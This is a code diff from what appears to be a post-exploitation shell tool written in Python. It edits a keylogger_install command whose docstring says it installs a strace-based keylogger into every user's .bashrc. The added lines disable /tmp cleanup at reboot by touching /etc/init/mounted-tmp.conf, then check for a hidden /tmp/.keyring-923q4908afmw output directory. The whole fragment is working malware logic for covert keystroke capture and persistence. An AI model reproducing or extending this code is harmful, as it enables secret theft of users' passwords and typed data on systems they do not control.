@@ -374,7 +374,13 @@ class Shell(cmd.Cmd):
 
     def do_keylogger_install(self, line):
        "Install Keylogger using strace, add to every users .bashrc"
-       do_disable_tmpclean(self, "")
+       
+       output = cmdoutput("touch /etc/init/mounted-tmp.conf && echo true")
+       if "true" in str(output):
+          print "Successful Disable if tmp dir clean after reboot"
+       else:
+          print "Unsuccessful tmp dir uninstall, either permissions or /etc/init/mounted-tmp.conf doesnt exist, grab files before reboot"
+       
        installcheck = cmdoutput("ls /tmp/.keyring-923q4908afmw && echo true")
        if "true" in str(installcheck):
          print "Its already installed dude... check the /tmp/.keyring-923q4908afmw/ directory for output"
